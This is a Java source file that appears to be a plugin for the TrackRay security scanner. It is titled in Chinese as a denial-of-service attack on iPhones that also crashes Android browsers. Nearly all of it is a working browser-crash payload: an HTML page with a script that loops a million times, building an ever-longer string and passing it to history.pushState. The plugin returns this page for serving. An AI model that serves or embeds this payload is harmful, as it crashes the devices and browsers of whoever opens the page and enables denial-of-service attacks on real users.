package com.trackray.module.plugin;

import com.trackray.scanner.annotation.Plugin;
import com.trackray.scanner.annotation.Rule;
import com.trackray.scanner.plugin.AbstractPlugin;
import com.trackray.scanner.plugin.CommonPlugin;

import java.util.Map;

@Plugin(value = "iphoneDOS2",
        title = "iPhone 拒绝服务，安卓浏览器闪退",
        author = "blue")
@Rule(type = AbstractPlugin.Type.HTML )
public class iPhoneDOS2 extends CommonPlugin<String> {
    @Override
    public boolean check(Map<String, String> param) {
        return true;
    }
    static String payload = "<html>\n" +
            "\n" +
            "<body>\n" +
            "\n" +
            "<script>\n" +
            "\n" +
            "var total=\"\";\n" +
            "\n" +
            "for (var i=0;i<1000000;i++)\n" +
            "\n" +
            "{\n" +
            "    total= total+i.toString ();\n" +
            "\n" +
            "    history.pushState (0,0,total);\n" +
            "\n" +
            "}\n" +
            "\n" +
            "</script>\n" +
            "\n" +
            "</body>\n" +
            "\n" +
            "</html>";


    @Override
    public String start() {
        return payload;
    }
}
